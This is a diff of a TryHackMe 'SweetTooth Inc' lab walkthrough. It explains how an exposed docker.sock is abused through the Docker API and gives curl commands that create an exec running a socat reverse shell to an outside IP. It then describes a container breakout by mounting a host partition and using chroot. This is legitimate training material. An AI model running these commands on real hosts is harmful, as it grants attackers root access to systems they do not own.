@@ -1,13 +1,13 @@
 ----------------
 
 ### CTF: TRYHACKME
-### LAB: SWEETTOOTHINC
+### LAB: SWEETTOOTH INC
 
-----------------
+---------------------
 
 ![image](https://github.com/user-attachments/assets/87cdb8eb-e485-421b-a6fe-ba1ab4e4dfbd)
 
-----------------
+--------------------
 
 ### RECON
 
@@ -118,6 +118,7 @@
     
 ![image](https://github.com/user-attachments/assets/f45b4714-b7ad-4566-9cf3-508969455a92)
 
+-----------------------
 
 ### SSH creds
 
@@ -133,4 +134,73 @@
 
 ![image](https://github.com/user-attachments/assets/fbd30a8c-b4d5-4504-a0d4-f3a82b320b92)
 
+- SSH Access
+
+![image](https://github.com/user-attachments/assets/e2f7ee5a-520a-4028-aa9b-e4d8edb8d16a)
+
+---------------------------
+
+### Docker Saga
+
+- After mintutes of enumerating, I noticed that `socat` is listening on `port 8080` with a unix client`/var/lib/run/docker.sock` socket.
+
+![image](https://github.com/user-attachments/assets/a95e3ef6-d2aa-402e-996b-777c0e786db8)
+
+- I got a way to exploit the docker socket and gain root on the container from this [site](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html).
+
+-----------------------
+
+### Explaining the docker.sock vulnerability
+`Docker.sock` is an example of unix socket with read,write, connect and bind capabilities. It allows connection to the docker daemon which receives API requests and solely manages container,images,volumes and networks.The docker.sock's unix socket allows us to communicate with the docker daemon for malicious purposes.
+
+--------------------------
+
+### Spawning a root rev shell
+
+- We need an existing container to spawn our shell.Make a request to route `/containers/json` to get a list of containers.The container id is the target.
+
+![image](https://github.com/user-attachments/assets/3b35fa05-62a7-4923-8ffe-6e848480bc48)
+
+- Execute a shell payload with endpoint `/containers/[id]/exec`
+
+      Cmd:curl http://localhost:8080/containers/[id]/exec -X POST -H  "Content-Type: application/json" -d '{"AttachStdin":false, "AttachStdout":true, "AttachStderr":true, "Tty":false, "Privileged":false, "Cmd":["socat","TCP:10.8.158.229:1337","EXEC:bash"]}'
+
+![image](https://github.com/user-attachments/assets/158b2635-a7ca-494a-af43-1a206832f584)
+
+- Start the rev shell container with endpoint `/containers/[id from the above cmd's output]/exec`
+
+      Cmd: curl http://localhost:8080/exec/[id]/start -X POST -H "Content-Type: application/json"  -d '{"Detach": false,"Tty": false}'
+
+
+- Container root shell,stabilize the shell with `script`
+
+![image](https://github.com/user-attachments/assets/803e160e-bd8d-4ddc-9547-f3dd8da63b8d)
+
+------------------------
+
+### Docker breakout by mounting host partition
+
+- After enumerating, I was able to mount a partition belonging to the host
+
+![image](https://github.com/user-attachments/assets/70e459dc-9853-4f16-b451-c85d46f55df8)
+
+- To access the host system as root, use `chroot <mount directory>`
+
+  ![image](https://github.com/user-attachments/assets/15fbc04c-34c9-4bd4-be75-2dfb4a7785de)
+
+- Root access
+
+![image](https://github.com/user-attachments/assets/9f97cb75-6413-45f8-bf34-209ef52f0312)
+
+-----------------------
+
+### REFERENCES
+
+- [Quarkslab's Docker.sock abuse](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
+- [Dejandayoff's docker](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
+- [Influxdb](https://exploit-notes.hdks.org/exploit/database/influxdb-pentesting/)
+
+------------------------
+
+### THANKS FOR READING
 
